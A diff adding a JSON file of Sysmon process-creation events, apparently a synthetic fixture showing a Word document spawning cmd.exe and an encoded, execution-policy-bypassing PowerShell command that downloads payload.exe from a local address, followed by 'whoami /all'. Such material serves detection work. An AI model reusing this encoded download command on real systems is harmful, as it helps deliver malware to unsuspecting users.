@@ -1,0 +1,86 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 08:30:01.234",
+    "ProcessGuid": "{a1b2c3d4-1001-6730-0001-000000000100}",
+    "ProcessId": 4012,
+    "Image": "C:\\Windows\\explorer.exe",
+    "CommandLine": "C:\\Windows\\explorer.exe",
+    "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
+    "ParentProcessId": 0,
+    "ParentImage": "-",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 08:30:05.891",
+    "ProcessGuid": "{a1b2c3d4-1002-6730-0002-000000000200}",
+    "ProcessId": 7284,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default",
+    "ParentProcessGuid": "{a1b2c3d4-1001-6730-0001-000000000100}",
+    "ParentProcessId": 4012,
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 08:30:06.452",
+    "ProcessGuid": "{a1b2c3d4-1003-6730-0003-000000000300}",
+    "ProcessId": 7312,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --lang=en-US --enable-auto-reload",
+    "ParentProcessGuid": "{a1b2c3d4-1002-6730-0002-000000000200}",
+    "ParentProcessId": 7284,
+    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 09:15:22.100",
+    "ProcessGuid": "{a1b2c3d4-2001-6730-0004-000000000400}",
+    "ProcessId": 5560,
+    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\mhassan\\Documents\\Q3_Report.docx\"",
+    "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
+    "ParentProcessId": 0,
+    "ParentImage": "-",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 09:15:33.785",
+    "ProcessGuid": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "ProcessId": 8844,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c powershell -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUA",
+    "ParentProcessGuid": "{a1b2c3d4-2001-6730-0004-000000000400}",
+    "ParentProcessId": 5560,
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 09:15:34.201",
+    "ProcessGuid": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "ProcessId": 9916,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell -ep bypass -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUA",
+    "ParentProcessGuid": "{a1b2c3d4-2002-6730-0005-000000000500}",
+    "ParentProcessId": 8844,
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "DESKTOP-ROG\\mhassan"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-11-09 09:15:35.670",
+    "ProcessGuid": "{a1b2c3d4-2004-6730-0007-000000000700}",
+    "ProcessId": 10204,
+    "Image": "C:\\Windows\\System32\\whoami.exe",
+    "CommandLine": "whoami.exe /all",
+    "ParentProcessGuid": "{a1b2c3d4-2003-6730-0006-000000000600}",
+    "ParentProcessId": 9916,
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "User": "DESKTOP-ROG\\mhassan"
+  }
+]
